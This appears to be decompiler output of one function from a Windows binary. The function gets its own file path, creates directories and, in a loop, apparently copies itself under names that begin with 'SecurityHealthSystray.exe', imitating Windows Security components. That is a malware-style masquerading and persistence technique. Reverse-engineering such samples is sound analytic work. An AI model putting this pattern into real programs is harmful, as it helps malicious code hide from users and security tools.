/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

undefined8 FUN_1400130f0(void)

{
  code *pcVar1;
  char cVar2;
  undefined4 uVar3;
  size_t sVar4;
  undefined8 uVar5;
  int extraout_var;
  undefined8 *****pppppuVar6;
  ulonglong uVar7;
  ulonglong uVar8;
  uint uVar9;
  undefined1 *puVar10;
  undefined1 *puVar11;
  undefined8 *****pppppuVar12;
  undefined8 uStack_210;
  undefined1 auStack_208 [8];
  undefined1 auStack_200 [24];
  int local_1e8;
  undefined4 local_1d8;
  undefined8 ****local_1d0;
  undefined **local_1c8;
  undefined8 ****local_1c0;
  undefined8 uStack_1b8;
  undefined8 local_1b0;
  ulonglong local_1a8;
  undefined8 ****local_1a0 [2];
  ulonglong local_190 [4];
  longlong local_170;
  ulonglong local_168;
  CHAR local_158 [272];
  ulonglong local_48;
  
  puVar11 = auStack_208;
  puVar10 = auStack_208;
  local_48 = DAT_140068100 ^ (ulonglong)auStack_208;
  uVar7 = 0;
  local_1d8 = 0;
  FUN_140049100(local_158,0,0x104);
  GetModuleFileNameA((HMODULE)0x0,local_158,0x104);
  FUN_140012c50(local_190 + 2);
  if (local_170 == 0) {
    sVar4 = strlen(local_158);
    FUN_14001a4c0(local_190 + 2,local_158,sVar4);
  }
  FUN_140011d90(local_1a0);
  if (local_190[0] != 0) {
    local_1d0 = &local_1c0;
    pppppuVar6 = local_1a0;
    if (0xf < local_190[1]) {
      pppppuVar6 = (undefined8 *****)local_1a0[0];
    }
    uVar3 = __std_fs_code_page();
    uStack_1b8 = 0;
    local_1b0 = 0;
    local_1a8 = 7;
    local_1c0 = (undefined8 *****)0x0;
    local_1d8 = 4;
    if (local_190[0] != 0) {
      if (0x7fffffff < local_190[0]) {
                    /* WARNING: Subroutine does not return */
        FUN_140008c80();
      }
      local_1e8 = 0;
      uVar5 = FUN_140023fbc(uVar3,pppppuVar6,local_190[0] & 0xffffffff,0);
      if ((int)((ulonglong)uVar5 >> 0x20) != 0) {
                    /* WARNING: Subroutine does not return */
        FUN_140009000();
      }
      FUN_140016170(&local_1c0,(longlong)(int)uVar5,0);
      pppppuVar12 = &local_1c0;
      if (7 < local_1a8) {
        pppppuVar12 = (undefined8 *****)local_1c0;
      }
      local_1e8 = (int)uVar5;
      FUN_140023fbc(uVar3,pppppuVar6,local_190[0] & 0xffffffff,pppppuVar12);
      if (extraout_var != 0) {
                    /* WARNING: Subroutine does not return */
        FUN_140009000(extraout_var);
      }
    }
    local_1d0 = (undefined8 ****)((ulonglong)local_1d0 & 0xffffffff00000000);
    local_1c8 = &PTR_vftable_140068d78;
    FUN_14000ae10(&local_1c0,&local_1d0);
    if ((int)local_1d0 != 0) {
                    /* WARNING: Subroutine does not return */
      FUN_14000a5e0("create_directories",&local_1d0,&local_1c0);
    }
    FUN_140018e20(&local_1c0);
    do {
      FUN_140012070(&local_1c0,(&PTR_s_SecurityHealthSystray.exe_14005a398)[uVar7]);
      FUN_140012ee0(local_190 + 2,&local_1c0);
      cVar2 = FUN_140012430(&local_1c0);
      if (cVar2 == '\0') {
        FUN_1400125a0(&local_1c0);
      }
      uVar9 = (int)uVar7 + 1;
      uVar7 = (ulonglong)uVar9;
      if ((int)uVar9 < 3) {
        Sleep(2000);
      }
      if (0xf < local_1a8) {
        uVar8 = local_1a8 + 1;
        pppppuVar6 = (undefined8 *****)local_1c0;
        if (0xfff < uVar8) {
          pppppuVar6 = (undefined8 *****)local_1c0[-1];
          if (0x1f < (ulonglong)((longlong)local_1c0 + (-8 - (longlong)pppppuVar6))) {
            pcVar1 = (code *)swi(0x29);
            (*pcVar1)(5);
            puVar10 = auStack_200;
            goto LAB_140013355;
          }
          uVar8 = local_1a8 + 0x28;
        }
        FUN_140026c34(pppppuVar6,uVar8);
      }
    } while ((int)uVar9 < 3);
  }
  if (0xf < local_190[1]) {
    pppppuVar6 = (undefined8 *****)local_1a0[0];
    puVar11 = auStack_208;
    if ((0xfff < local_190[1] + 1) &&
       (pppppuVar6 = (undefined8 *****)local_1a0[0][-1], puVar11 = auStack_208,
       0x1f < (ulonglong)((longlong)local_1a0[0] + (-8 - (longlong)pppppuVar6)))) {
LAB_140013355:
      pcVar1 = (code *)swi(0x29);
      pppppuVar6 = (undefined8 *****)(*pcVar1)(5);
      puVar11 = puVar10 + 8;
    }
    *(undefined8 *)(puVar11 + -8) = 0x140013364;
    FUN_140026c34(pppppuVar6);
  }
  *(undefined8 *)(puVar11 + 0x78) = 0;
  local_190[1] = 0xf;
  puVar11[0x68] = 0;
  if (0xf < local_168) {
    uVar7 = local_190[2];
    if ((0xfff < local_168 + 1) &&
       (uVar7 = *(longlong *)(local_190[2] + -8), 0x1f < (local_190[2] - uVar7) - 8)) {
      pcVar1 = (code *)swi(0x29);
      uVar7 = (*pcVar1)(5);
      puVar11 = puVar11 + 8;
    }
    *(undefined8 *)(puVar11 + -8) = 0x1400133b6;
    FUN_140026c34(uVar7);
  }
  *(undefined8 *)(puVar11 + -8) = 0x1400133c7;
  return 0;
}
